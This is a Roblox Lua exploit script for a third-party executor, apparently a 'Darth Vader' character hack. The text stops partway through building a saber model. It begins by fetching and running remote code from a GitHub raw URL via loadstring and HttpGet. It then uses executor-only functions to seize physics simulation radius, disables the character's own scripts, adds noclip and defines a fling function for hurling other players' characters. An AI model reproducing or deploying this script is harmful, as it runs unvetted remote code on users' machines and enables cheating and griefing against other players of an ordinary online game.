--darth vader


loadstring(game:HttpGet("https://raw.githubusercontent.com/ilikeices/script/refs/heads/main/game.luau"))()

if game.PlaceId == 168556275 then
	game:GetService("Players").LocalPlayer:Kick("wrong game search: [UP] Just a baseplate. - creator: the local maze")
end

if not game:GetService("ReplicatedStorage"):FindFirstChild("01_server") then local a=game:GetService("CollectionService")local b={}b["ScreenGui_1"]=Instance.new("ScreenGui")b["ScreenGui_1"].IgnoreGuiInset=true b["ScreenGui_1"].Parent=game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui") b["ScreenGui_1"].ScreenInsets=Enum.ScreenInsets.DeviceSafeInsets b["ScreenGui_1"].ResetOnSpawn=false b["ScreenGui_1"].ZIndexBehavior=Enum.ZIndexBehavior.Sibling a:AddTag(b["ScreenGui_1"],"main")b["Frame_2"]=Instance.new("Frame",b["ScreenGui_1"])b["Frame_2"].BorderSizePixel=0 b["Frame_2"].BackgroundColor3=Color3.fromRGB(0,0,0)b["Frame_2"].AnchorPoint=Vector2.new(.5,.5)b["Frame_2"].Size=UDim2.new(.36316,0,.46667,0)b["Frame_2"].Position=UDim2.new(.5,0,.5,0)b["Frame_2"].BackgroundTransparency=.5 b["UICorner_3"]=Instance.new("UICorner",b["Frame_2"])b["UICorner_3"].CornerRadius=UDim.new(.04,0)b["TextLabel_4"]=Instance.new("TextLabel",b["Frame_2"])b["TextLabel_4"].TextWrapped=true b["TextLabel_4"].BorderSizePixel=0 b["TextLabel_4"].TextScaled=true b["TextLabel_4"].BackgroundColor3=Color3.fromRGB(255,255,255)b["TextLabel_4"].TextColor3=Color3.fromRGB(255,255,255)b["TextLabel_4"].BackgroundTransparency=1 b["TextLabel_4"].Size=UDim2.new(.81159,0,.32143,0)b["TextLabel_4"].Text="You are in the wrong game, please copy the link below and enter the game. (game: [UP] Just a baseplate. /  Green baseplate., game creator: the local maze)"b["TextLabel_4"].Position=UDim2.new(.0942,0,.13095,0)b["TextBox_5"]=Instance.new("TextBox",b["Frame_2"])b["TextBox_5"].CursorPosition=-1 b["TextBox_5"].BorderSizePixel=0 b["TextBox_5"].BackgroundColor3=Color3.fromRGB(255,255,255)b["TextBox_5"].ClearTextOnFocus=false b["TextBox_5"].Size=UDim2.new(.81159,0,.29762,0)b["TextBox_5"].Position=UDim2.new(.1087,0,.5119,0)b["TextBox_5"].Text="https://www.roblox.com/games/123974602339071/UP-Just-a-baseplate"b["TextBox_5"].TextScaled=true b["UIAspectRatioConstraint_6"]=Instance.new("UIAspectRatioConstraint",b["Frame_2"])b["UIAspectRatioConstraint_6"].AspectRatio=1.64286 game:GetService("TeleportService"):Teleport(123974602339071,game:GetService("Players").LocalPlayer) return end

game.ReplicatedStorage["01_server"]:FireServer("cmd", "-gh 5979445178")
task.wait(3)

local Vector3_101 = Vector3.new(1, 0, 1)
local netless_Y = Vector3.new(0, 25.1, 0)
local function getNetlessVelocity(realPartVelocity) --edit this if you have a better netless method
    local unit = realPartVelocity.Unit
    if (unit.Y > 0.9) or (unit.Y < -0.9) then
        return realPartVelocity * (25.1 / realPartVelocity.Y)
    end
    realPartVelocity = Vector3_101 * realPartVelocity
    local mag = realPartVelocity.Magnitude
    if (mag > 1) and (mag < 100) then
        realPartVelocity = unit * Vector3_101 * 100
    end
    return realPartVelocity + netless_Y
end
local simradius = "shp" --simulation radius (net bypass) method
--"shp" - sethiddenproperty
--"ssr" - setsimulationradius
--false - disable
local noclipAllParts = false --set it to true if you want noclip
local flingpart = "HumanoidRootPart" --the part that will be used to fling (ctrl + F "fling function")
local antiragdoll = true --removes hingeConstraints and ballSocketConstraints from your character
local newanimate = true --disables the animate script and enables after reanimation
local discharscripts = true --disables all localScripts parented to your character before reanimation
local R15toR6 = true --tries to convert your character to r6 if its r15
local hatcollide = false --makes hats cancollide (credit to ShownApe) (works only with reanimate method 0)
local humState16 = true --enables collisions for limbs before the humanoid dies (using hum:ChangeState)
local addtools = false --puts all tools from backpack to character and lets you hold them after reanimation
local hedafterneck = true --disable aligns for head and enable after neck or torso is removed
local loadtime = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
local method = 3 --reanimation method
--methods:
--0 - breakJoints (takes [loadtime] seconds to laod)
--1 - limbs
--2 - limbs + anti respawn
--3 - limbs + breakJoints after [loadtime] seconds
--4 - remove humanoid + breakJoints
--5 - remove humanoid + limbs
local alignmode = 2 --AlignPosition mode
--modes:
--1 - AlignPosition rigidity enabled true
--2 - 2 AlignPositions rigidity enabled both true and false
--3 - AlignPosition rigidity enabled false

local lp = game:GetService("Players").LocalPlayer
local rs = game:GetService("RunService")
local stepped = rs.Stepped
local heartbeat = rs.Heartbeat
local renderstepped = rs.RenderStepped
local sg = game:GetService("StarterGui")
local ws = game:GetService("Workspace")
local cf = CFrame.new
local v3 = Vector3.new
local v3_0 = Vector3.zero
local inf = math.huge

local c = lp.Character

if not (c and c.Parent) then
	return
end

c.Destroying:Connect(function()
	c = nil
end)

local function gp(parent, name, className)
	if typeof(parent) == "Instance" then
		for i, v in pairs(parent:GetChildren()) do
			if (v.Name == name) and v:IsA(className) then
				return v
			end
		end
	end
	return nil
end



local function align(Part0, Part1)
	Part0.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)

	local att0 = Instance.new("Attachment", Part0)
	att0.Orientation = v3_0
	att0.Position = v3_0
	att0.Name = "att0_" .. Part0.Name
	local att1 = Instance.new("Attachment", Part1)
	att1.Orientation = v3_0
	att1.Position = v3_0
	att1.Name = "att1_" .. Part1.Name

	if (alignmode == 1) or (alignmode == 2) then
		local ape = Instance.new("AlignPosition", att0)
		ape.ApplyAtCenterOfMass = false
		ape.MaxForce = inf
		ape.MaxVelocity = inf
		ape.ReactionForceEnabled = false
		ape.Responsiveness = 200
		ape.Attachment1 = att1
		ape.Attachment0 = att0
		ape.Name = "AlignPositionRtrue"
		ape.RigidityEnabled = true
	end

	if (alignmode == 2) or (alignmode == 3) then
		local apd = Instance.new("AlignPosition", att0)
		apd.ApplyAtCenterOfMass = false
		apd.MaxForce = inf
		apd.MaxVelocity = inf
		apd.ReactionForceEnabled = false
		apd.Responsiveness = 200
		apd.Attachment1 = att1
		apd.Attachment0 = att0
		apd.Name = "AlignPositionRfalse"
		apd.RigidityEnabled = false
	end

	local ao = Instance.new("AlignOrientation", att0)
	ao.MaxAngularVelocity = inf
	ao.MaxTorque = inf
	ao.PrimaryAxisOnly = false
	ao.ReactionTorqueEnabled = false
	ao.Responsiveness = 200
	ao.Attachment1 = att1
	ao.Attachment0 = att0
	ao.RigidityEnabled = false

	if type(getNetlessVelocity) == "function" then
	    local realVelocity = v3_0
        local steppedcon = stepped:Connect(function()
            Part0.Velocity = realVelocity
        end)
        local heartbeatcon = heartbeat:Connect(function()
            realVelocity = Part0.Velocity
            Part0.Velocity = getNetlessVelocity(realVelocity)
        end)
        Part0.Destroying:Connect(function()
            Part0 = nil
            steppedcon:Disconnect()
            heartbeatcon:Disconnect()
        end)
    end
end

local function respawnrequest()
	local ccfr = ws.CurrentCamera.CFrame
	local c = lp.Character
	lp.Character = nil
	lp.Character = c
	local con = nil
	con = ws.CurrentCamera.Changed:Connect(function(prop)
	    if (prop ~= "Parent") and (prop ~= "CFrame") then
	        return
	    end
	    ws.CurrentCamera.CFrame = ccfr
	    con:Disconnect()
    end)
end

local destroyhum = (method == 4) or (method == 5)
local breakjoints = (method == 0) or (method == 4)
local antirespawn = (method == 0) or (method == 2) or (method == 3)

hatcollide = hatcollide and (method == 0)

addtools = addtools and gp(lp, "Backpack", "Backpack")

local fenv = getfenv()
local shp = fenv.sethiddenproperty or fenv.set_hidden_property or fenv.set_hidden_prop or fenv.sethiddenprop
local ssr = fenv.setsimulationradius or fenv.set_simulation_radius or fenv.set_sim_radius or fenv.setsimradius or fenv.set_simulation_rad or fenv.setsimulationrad

if shp and (simradius == "shp") then
	spawn(function()
		while c and heartbeat:Wait() do
			shp(lp, "SimulationRadius", inf)
		end
	end)
elseif ssr and (simradius == "ssr") then
	spawn(function()
		while c and heartbeat:Wait() do
			ssr(inf)
		end
	end)
end

antiragdoll = antiragdoll and function(v)
	if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
		v.Parent = nil
	end
end

if antiragdoll then
	for i, v in pairs(c:GetDescendants()) do
		antiragdoll(v)
	end
	c.DescendantAdded:Connect(antiragdoll)
end

if antirespawn then
	respawnrequest()
end

if method == 0 then
	wait(loadtime)
	if not c then
		return
	end
end

if discharscripts then
	for i, v in pairs(c:GetChildren()) do
		if v:IsA("LocalScript") then
			v.Disabled = true
		end
	end
elseif newanimate then
	local animate = gp(c, "Animate", "LocalScript")
	if animate and (not animate.Disabled) then
		animate.Disabled = true
	else
		newanimate = false
	end
end

if addtools then
	for i, v in pairs(addtools:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = c
		end
	end
end

pcall(function()
	settings().Physics.AllowSleep = false
	settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
end)

local OLDscripts = {}

for i, v in pairs(c:GetDescendants()) do
	if v.ClassName == "Script" then
		table.insert(OLDscripts, v)
	end
end

local scriptNames = {}

for i, v in pairs(c:GetDescendants()) do
	if v:IsA("BasePart") then
		local newName = tostring(i)
		local exists = true
		while exists do
			exists = false
			for i, v in pairs(OLDscripts) do
				if v.Name == newName then
					exists = true
				end
			end
			if exists then
				newName = newName .. "_"    
			end
		end
		table.insert(scriptNames, newName)
		Instance.new("Script", v).Name = newName
	end
end

c.Archivable = true
local hum = c:FindFirstChildOfClass("Humanoid")
if hum then
	for i, v in pairs(hum:GetPlayingAnimationTracks()) do
		v:Stop()
	end
end
local cl = c:Clone()
cl.Name = lp.Name
if hum and humState16 then
    hum:ChangeState(Enum.HumanoidStateType.Physics)
    if destroyhum then
        wait(1.6)
    end
end
if hum and hum.Parent and destroyhum then
    hum:Destroy()
end

if not c then
    return
end

local head = gp(c, "Head", "BasePart")
local torso = gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart")
local root = gp(c, "HumanoidRootPart", "BasePart")
if hatcollide and c:FindFirstChildOfClass("Accessory") then
    local anything = c:FindFirstChildOfClass("BodyColors") or gp(c, "Health", "Script")
    if not (torso and root and anything) then
        return
    end
    torso:Destroy()
    root:Destroy()
    if shp then
        for i,v in pairs(c:GetChildren()) do
            if v:IsA("Accessory") then
                shp(v, "BackendAccoutrementState", 0)
            end 
        end
    end
    anything:Destroy()
end

for i, v in pairs(cl:GetDescendants()) do
	if v:IsA("BasePart") then
		v.Transparency = 1
		v.Anchored = false
	end
end

local model = Instance.new("Model", c)
model.Name = model.ClassName

model.Destroying:Connect(function()
	model = nil
end)

for i, v in pairs(c:GetChildren()) do
	if v ~= model then
		if addtools and v:IsA("Tool") then
			for i1, v1 in pairs(v:GetDescendants()) do
				if v1 and v1.Parent and v1:IsA("BasePart") then
					local bv = Instance.new("BodyVelocity", v1)
					bv.Velocity = v3_0
					bv.MaxForce = v3(1000, 1000, 1000)
					bv.P = 1250
					bv.Name = "bv_" .. v.Name
				end
			end
		end
		v.Parent = model
	end
end

if breakjoints then
	model:BreakJoints()
else
	if head and torso then
		for i, v in pairs(model:GetDescendants()) do
			if v:IsA("Weld") or v:IsA("Snap") or v:IsA("Glue") or v:IsA("Motor") or v:IsA("Motor6D") then
				local save = false
				if (v.Part0 == torso) and (v.Part1 == head) then
					save = true
				end
				if (v.Part0 == head) and (v.Part1 == torso) then
					save = true
				end
				if save then
					if hedafterneck then
						hedafterneck = v
					end
				else
					v:Destroy()
				end
			end
		end
	end
	if method == 3 then
		spawn(function()
			wait(loadtime)
			if model then
				model:BreakJoints()
			end
		end)
	end
end

cl.Parent = c
for i, v in pairs(cl:GetChildren()) do
	v.Parent = c
end
cl:Destroy()

local noclipmodel = (noclipAllParts and c) or model
local noclipcon = nil
local function uncollide()
	if noclipmodel then
		for i, v in pairs(noclipmodel:GetDescendants()) do
		    if v:IsA("BasePart") then
			    v.CanCollide = false
		    end
		end
	else
		noclipcon:Disconnect()
	end
end
noclipcon = stepped:Connect(uncollide)
uncollide()

for i, scr in pairs(model:GetDescendants()) do
	if (scr.ClassName == "Script") and table.find(scriptNames, scr.Name) then
		local Part0 = scr.Parent
		if Part0:IsA("BasePart") then
			for i1, scr1 in pairs(c:GetDescendants()) do
				if (scr1.ClassName == "Script") and (scr1.Name == scr.Name) and (not scr1:IsDescendantOf(model)) then
					local Part1 = scr1.Parent
					if (Part1.ClassName == Part0.ClassName) and (Part1.Name == Part0.Name) then
						align(Part0, Part1)
						break
					end
				end
			end
		end
	end
end

for i, v in pairs(c:GetDescendants()) do
	if v and v.Parent then
		if v.ClassName == "Script" then
			if table.find(scriptNames, v.Name) then
				v:Destroy()
			end
		elseif not v:IsDescendantOf(model) then
			if v:IsA("Decal") then
				v.Transparency = 1
			elseif v:IsA("ForceField") then
				v.Visible = false
			elseif v:IsA("Sound") then
				v.Playing = false
			elseif v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
				v.Enabled = false
			end
		end
	end
end

if newanimate then
	local animate = gp(c, "Animate", "LocalScript")
	if animate then
		animate.Disabled = false
	end
end

if addtools then
	for i, v in pairs(c:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = addtools
		end
	end
end

local hum0 = model:FindFirstChildOfClass("Humanoid")
if hum0 then
    hum0.Destroying:Connect(function()
        hum0 = nil
    end)
end

local hum1 = c:FindFirstChildOfClass("Humanoid")
if hum1 then
    hum1.Destroying:Connect(function()
        hum1 = nil
    end)
end

if hum1 then
	ws.CurrentCamera.CameraSubject = hum1
	local camSubCon = nil
	local function camSubFunc()
		camSubCon:Disconnect()
		if c and hum1 then
			ws.CurrentCamera.CameraSubject = hum1
		end
	end
	camSubCon = renderstepped:Connect(camSubFunc)
	if hum0 then
		hum0:GetPropertyChangedSignal("Jump"):Connect(function()
			if hum1 then
				hum1.Jump = hum0.Jump
			end
		end)
	else
		respawnrequest()
	end
end

local rb = Instance.new("BindableEvent", c)
rb.Event:Connect(function()
	rb:Destroy()
	sg:SetCore("ResetButtonCallback", true)
	if destroyhum then
		c:BreakJoints()
		return
	end
	if hum0 and (hum0.Health > 0) then
		model:BreakJoints()
		hum0.Health = 0
	end
	if antirespawn then
	    respawnrequest()
	end
end)
sg:SetCore("ResetButtonCallback", rb)

spawn(function()
	while c do
		if hum0 and hum1 then
			hum1.Jump = hum0.Jump
		end
		wait()
	end
	sg:SetCore("ResetButtonCallback", true)
end)

R15toR6 = R15toR6 and hum1 and (hum1.RigType == Enum.HumanoidRigType.R15)
if R15toR6 then
    local part = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "UpperTorso", "BasePart") or gp(c, "LowerTorso", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
	if part then
	    local cfr = part.CFrame
		local R6parts = { 
			head = {
				Name = "Head",
				Size = v3(2, 1, 1),
				R15 = {
					Head = 0
				}
			},
			torso = {
				Name = "Torso",
				Size = v3(2, 2, 1),
				R15 = {
					UpperTorso = 0.2,
					LowerTorso = -0.8
				}
			},
			root = {
				Name = "HumanoidRootPart",
				Size = v3(2, 2, 1),
				R15 = {
					HumanoidRootPart = 0
				}
			},
			leftArm = {
				Name = "Left Arm",
				Size = v3(1, 2, 1),
				R15 = {
					LeftHand = -0.85,
					LeftLowerArm = -0.2,
					LeftUpperArm = 0.4
				}
			},
			rightArm = {
				Name = "Right Arm",
				Size = v3(1, 2, 1),
				R15 = {
					RightHand = -0.85,
					RightLowerArm = -0.2,
					RightUpperArm = 0.4
				}
			},
			leftLeg = {
				Name = "Left Leg",
				Size = v3(1, 2, 1),
				R15 = {
					LeftFoot = -0.85,
					LeftLowerLeg = -0.15,
					LeftUpperLeg = 0.6
				}
			},
			rightLeg = {
				Name = "Right Leg",
				Size = v3(1, 2, 1),
				R15 = {
					RightFoot = -0.85,
					RightLowerLeg = -0.15,
					RightUpperLeg = 0.6
				}
			}
		}
		for i, v in pairs(c:GetChildren()) do
			if v:IsA("BasePart") then
				for i1, v1 in pairs(v:GetChildren()) do
					if v1:IsA("Motor6D") then
						v1.Part0 = nil
					end
				end
			end
		end
		part.Archivable = true
		for i, v in pairs(R6parts) do
			local part = part:Clone()
			part:ClearAllChildren()
			part.Name = v.Name
			part.Size = v.Size
			part.CFrame = cfr
			part.Anchored = false
			part.Transparency = 1
			part.CanCollide = false
			for i1, v1 in pairs(v.R15) do
				local R15part = gp(c, i1, "BasePart")
				local att = gp(R15part, "att1_" .. i1, "Attachment")
				if R15part then
					local weld = Instance.new("Weld", R15part)
					weld.Name = "Weld_" .. i1
					weld.Part0 = part
					weld.Part1 = R15part
					weld.C0 = cf(0, v1, 0)
					weld.C1 = cf(0, 0, 0)
					R15part.Massless = true
					R15part.Name = "R15_" .. i1
					R15part.Parent = part
					if att then
						att.Parent = part
						att.Position = v3(0, v1, 0)
					end
				end
			end
			part.Parent = c
			R6parts[i] = part
		end
		local R6joints = {
			neck = {
				Parent = R6parts.torso,
				Name = "Neck",
				Part0 = R6parts.torso,
				Part1 = R6parts.head,
				C0 = cf(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
				C1 = cf(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			},
			rootJoint = {
				Parent = R6parts.root,
				Name = "RootJoint" ,
				Part0 = R6parts.root,
				Part1 = R6parts.torso,
				C0 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
				C1 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			},
			rightShoulder = {
				Parent = R6parts.torso,
				Name = "Right Shoulder",
				Part0 = R6parts.torso,
				Part1 = R6parts.rightArm,
				C0 = cf(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
				C1 = cf(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			},
			leftShoulder = {
				Parent = R6parts.torso,
				Name = "Left Shoulder",
				Part0 = R6parts.torso,
				Part1 = R6parts.leftArm,
				C0 = cf(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
				C1 = cf(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			},
			rightHip = {
				Parent = R6parts.torso,
				Name = "Right Hip",
				Part0 = R6parts.torso,
				Part1 = R6parts.rightLeg,
				C0 = cf(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
				C1 = cf(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			},
			leftHip = {
				Parent = R6parts.torso,
				Name = "Left Hip" ,
				Part0 = R6parts.torso,
				Part1 = R6parts.leftLeg,
				C0 = cf(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
				C1 = cf(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			}
		}
		for i, v in pairs(R6joints) do
			local joint = Instance.new("Motor6D")
			for prop, val in pairs(v) do
				joint[prop] = val
			end
			R6joints[i] = joint
		end
		hum1.RigType = Enum.HumanoidRigType.R6
		hum1.HipHeight = 0
	end
end

local torso1 = torso
torso = gp(c, "Torso", "BasePart") or ((not R15toR6) and gp(c, torso.Name, "BasePart"))
if (typeof(hedafterneck) == "Instance") and head and torso and torso1 then
	local conNeck = nil
	local conTorso = nil
	local contorso1 = nil
	local aligns = {}
	local function enableAligns()
	    conNeck:Disconnect()
        conTorso:Disconnect()
        conTorso1:Disconnect()
		for i, v in pairs(aligns) do
			v.Enabled = true
		end
	end
	conNeck = hedafterneck.Changed:Connect(function(prop)
	    if table.find({"Part0", "Part1", "Parent"}, prop) then
	        enableAligns()
		end
	end)
	conTorso = torso:GetPropertyChangedSignal("Parent"):Connect(enableAligns)
	conTorso1 = torso1:GetPropertyChangedSignal("Parent"):Connect(enableAligns)
	for i, v in pairs(head:GetDescendants()) do
		if v:IsA("AlignPosition") or v:IsA("AlignOrientation") then
			i = tostring(i)
			aligns[i] = v
			v.Destroying:Connect(function()
			    aligns[i] = nil
			end)
			v.Enabled = false
		end
	end
end

--[[
    fling function
    usage: fling(target, duration, velocity)
    target can be set to: basePart, CFrame, Vector3, character model or humanoid
    duration (fling time) can be set to a number or a string containing the number (in seconds) will be set to 0.5 if not provided,
    velocity (fling part rotation velocity) can be set to a vector3 value (Vector3.new(20000, 20000, 20000) if not provided)
]]

local flingpart0 = gp(model, flingpart, "BasePart")
local flingpart1 = gp(c, flingpart, "BasePart")

local fling = function() end
if flingpart0 and flingpart1 then
    flingpart0.Destroying:Connect(function()
        flingpart0 = nil
        fling = function() end
    end)
    flingpart0.Archivable = true
    flingpart1.Destroying:Connect(function()
        flingpart1 = nil
        fling = function() end
    end)
    local att0 = gp(flingpart0, "att0_" .. flingpart0.Name, "Attachment")
    local att1 = gp(flingpart1, "att1_" .. flingpart1.Name, "Attachment")
    if att0 and att1 then
        att0.Destroying:Connect(function()
            att0 = nil
            fling = function() end
        end)
        att1.Destroying:Connect(function()
            att1 = nil
            fling = function() end
        end)
        local lastfling = nil
        fling = function(target, duration, rotVelocity)
            if typeof(target) == "Instance" then
                if target:IsA("BasePart") then
                    target = target.Position
                elseif target:IsA("Model") then
                    target = gp(target, "HumanoidRootPart", "BasePart") or gp(target, "Torso", "BasePart") or gp(target, "UpperTorso", "BasePart") or target:FindFirstChildWhichIsA("BasePart")
                    if target then
                        target = target.Position
                    else
                        return
                    end
                elseif target:IsA("Humanoid") then
                    local parent = target.Parent
                    if not (parent and parent:IsA("Model")) then
                        return
                    end
                    target = gp(target, "HumanoidRootPart", "BasePart") or gp(target, "Torso", "BasePart") or gp(target, "UpperTorso", "BasePart") or target:FindFirstChildWhichIsA("BasePart")
                    if target then
                        target = target.Position
                    else
                        return
                    end
                else
                    return
                end
            elseif typeof(target) == "CFrame" then
                target = target.Position
            elseif typeof(target) ~= "Vector3" then
                return
            end
            lastfling = target
            if type(duration) ~= "number" then
                duration = tonumber(duration) or 0.5
            end
            if typeof(rotVelocity) ~= "Vector3" then
                rotVelocity = v3(20000, 20000, 20000)
            end
            if not (target and flingpart0 and flingpart1 and att0 and att1) then
                return
            end
            local flingpart = flingpart0:Clone()
            flingpart.Transparency = 1
            flingpart.Size = v3(0.01, 0.01, 0.01)
            flingpart.CanCollide = false
            flingpart.Name = "flingpart_" .. flingpart0.Name
            flingpart.Anchored = true
            flingpart.Velocity = v3_0
            flingpart.RotVelocity = v3_0
            flingpart.Destroying:Connect(function()
                flingpart = nil
            end)
            flingpart.Parent = flingpart1
            if flingpart0.Transparency > 0.8 then
                flingpart0.Transparency = 0.8
            end
            att1.Parent = flingpart
            for i, v in pairs(att0:GetChildren()) do
                if v:IsA("AlignOrientation") then
                    v.Enabled = false
                end
            end
            local con = nil
            con = heartbeat:Connect(function()
                if target and (lastfling == target) and flingpart and flingpart0 and flingpart1 and att0 and att1 then
                    flingpart0.RotVelocity = rotVelocity
                    flingpart.Position = target
                else
                    con:Disconnect()
                end
            end)
            local steppedRotVel = v3(
                ((rotVelocity.X > 0) and -1) or 1,
                ((rotVelocity.Y > 0) and -1) or 1,
                ((rotVelocity.Z > 0) and -1) or 1
            )
            local con = nil
            con = stepped:Connect(function()
                if target and (lastfling == target) and flingpart and flingpart0 and flingpart1 and att0 and att1 then
                    flingpart0.RotVelocity = steppedRotVel
                    flingpart.Position = target
                else
                    con:Disconnect()
                end
            end)
            wait(duration)
            if lastfling ~= target then
                if flingpart then
                    if att1 and (att1.Parent == flingpart) then
                        att1.Parent = flingpart1
                    end
                    flingpart:Destroy()
                end
                return
            end
            target = nil
            if not (flingpart and flingpart0 and flingpart1 and att0 and att1) then
                return
            end
            flingpart0.RotVelocity = v3_0
            att1.Parent = flingpart1
            for i, v in pairs(att0:GetChildren()) do
                if v:IsA("AlignOrientation") then
                    v.Enabled = true
                end
            end
            if flingpart then
                flingpart:Destroy()
            end
        end
    end
end


task.wait(2)

_G.loop = true
local player = game.Players.LocalPlayer
local char = player.Character
local Align = function(Part0, Part1,Mesh)
    local Aligns = {
        AlignOrientation = Instance.new("AlignOrientation", Part0),
        AlignPosition = Instance.new("AlignPosition", Part0)
    }
    
    local Attachments = {
        Attach0 = Instance.new("Attachment", Part0),
        Attach1 = Instance.new("Attachment", Part1)
    }
    local m = Part0:FindFirstChildOfClass('SpecialMesh')--This will get the first "SpecialMesh" it finds if it does not find any, then it will return nil
    if Mesh and m then --If Mesh is set to true and it finds a mesh it will destroy it
        m:Destroy()
    end
    Part0:BreakJoints()
    Aligns.AlignOrientation.Attachment0 = Attachments.Attach0
    Aligns.AlignOrientation.Attachment1 = Attachments.Attach1
    Aligns.AlignOrientation.Responsiveness = math.huge
    Aligns.AlignOrientation.RigidityEnabled = true
    
    Aligns.AlignPosition.Attachment0 = Attachments.Attach0
    Aligns.AlignPosition.Attachment1 = Attachments.Attach1
    Aligns.AlignPosition.Responsiveness = math.huge
    Aligns.AlignPosition.RigidityEnabled = true
        Aligns.AlignPosition.MaxForce = 999999999
        spawn(function()
            while _G.loop do 
                local mag = (Part0.Position - (Part1.CFrame*Attachments.Attach0.CFrame:Inverse()).p).magnitude--magnitude can get the distance between two cframe or position
                if mag >= 5 then 
                Part0.CFrame = Part1.CFrame*Attachments.Attach0.CFrame:Inverse()
                end
                Part0.Velocity = Vector3.new(0,35,0)
                game['Run Service'].Heartbeat:wait()
                end
        end)
 return {Attachments.Attach0, Attachments, Aligns}
        
end 
local hat = Align(char['RedSaber'].Handle,char['Right Arm'],false)
local cf = char['Right Arm'].CFrame*CFrame.new(0,-1,-2)*CFrame.Angles(math.rad(270),math.rad(-90),0)
hat[1].CFrame = cf:Inverse() * char['Right Arm'].CFrame
spawn(function()
    char.AncestryChanged:wait()--if you respawn, it will stop the  loop to avoid lag of using it over and over
    _G.loop = false 
end)

local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer
local Mouse = plr:GetMouse()
local char = plr.Character
local tweenserv = game:GetService("TweenService")
local lighting = game:GetService("Lighting")
local hum = char:FindFirstChildOfClass("Humanoid")
local tor = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
local root = char:FindFirstChild("HumanoidRootPart")
local head = char:FindFirstChild("Head")

local larm = char:FindFirstChild("Left Arm") or char:FindFirstChild("LeftUpperArm")
local rarm = char:FindFirstChild("Right Arm") or char:FindFirstChild("RightUpperArm")
local rleg = char:FindFirstChild("Right Leg") or char:FindFirstChild("RightUpperLeg")
local lleg = char:FindFirstChild("Left Leg") or char:FindFirstChild("LeftUpperLeg")
local neck = tor:FindFirstChild("Neck")
local rootj = root:FindFirstChild("RootJoint")
local LS = tor:FindFirstChild("Left Shoulder")
local RS = tor:FindFirstChild("Right Shoulder")
local LH = tor:FindFirstChild("Left Hip")
local RH = tor:FindFirstChild("Right Hip")
local bp = plr:FindFirstChild("Backpack")
local cam = workspace.CurrentCamera
hum.WalkSpeed = 25
char.Animate:remove()


--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
Model0 = Instance.new("Model")
Part1 = Instance.new("Part")
ManualWeld2 = Instance.new("ManualWeld")
Part3 = Instance.new("Part")
Part4 = Instance.new("Part")
ManualWeld5 = Instance.new("ManualWeld")
Part6 = Instance.new("Part")
ManualWeld7 = Instance.new("ManualWeld")
Part8 = Instance.new("Part")
ParticleEmitter9 = Instance.new("ParticleEmitter")
ManualWeld10 = Instance.new("ManualWeld")
Part11 = Instance.new("Part")
ManualWeld12 = Instance.new("ManualWeld")
Part19 = Instance.new("Part")
ManualWeld20 = Instance.new("ManualWeld")
Part21 = Instance.new("Part")
ManualWeld22 = Instance.new("ManualWeld")
Model0.Name = "saber"
Model0.Parent = mas
Part1.Name = "hand"
Part1.Parent = Model0
Part1.Material = Enum.Material.SmoothPlastic
Part1.BrickColor = BrickColor.new("Really black")
Part1.Rotation = Vector3.new(0, -90, 0)
Part1.CanCollide = false
Part1.Shape = Enum.PartType.Cylinder
Part1.Size = Vector3.new(1.29999995, 0.299999952, 0.299999952)
Part1.CFrame = CFrame.new(-1741.76343, 117.599991, -204.231796, 1.19248806e-08, 0, -1, 0, 1, 0, 1, 0, 1.19248806e-08)
Part1.BottomSurface = Enum.SurfaceType.Smooth
Part1.TopSurface = Enum.SurfaceType.Smooth
Part1.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part1.Position = Vector3.new(-1741.76343, 117.599991, -204.231796)
Part1.Orientation = Vector3.new(0, -90, 0)
Part1.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
ManualWeld2.Name = "Weld"
ManualWeld2.Parent = Part1
ManualWeld2.C0 = CFrame.new(0, 0, 0, 1.19248806e-08, 0, 1, 0, 1, 0, -1, 0, 1.19248806e-08)
ManualWeld2.C1 = CFrame.new(0.0347900391, 0, 0.0680541992, 1, 0, 0, 0, 1, 0, 0, 0, 1)
ManualWeld2.Part0 = Part1
ManualWeld2.Part1 = Part3
Part3.Name = "main"
Part3.Parent = Model0
Part3.Transparency = 1
Part3.CanCollide = false
Part3.Size = Vector3.new(1, 1, 1)
Part3.CFrame = CFrame.new(-1741.79822, 117.599991, -204.29985, 1, 0, 0, 0, 1, 0, 0, 0, 1)
Part3.BottomSurface = Enum.SurfaceType.Smooth
Part3.TopSurface = Enum.SurfaceType.Smooth
Part3.Position = Vector3.new(-1741.79822, 117.599991, -204.29985)
Part4.Name = "cap2"
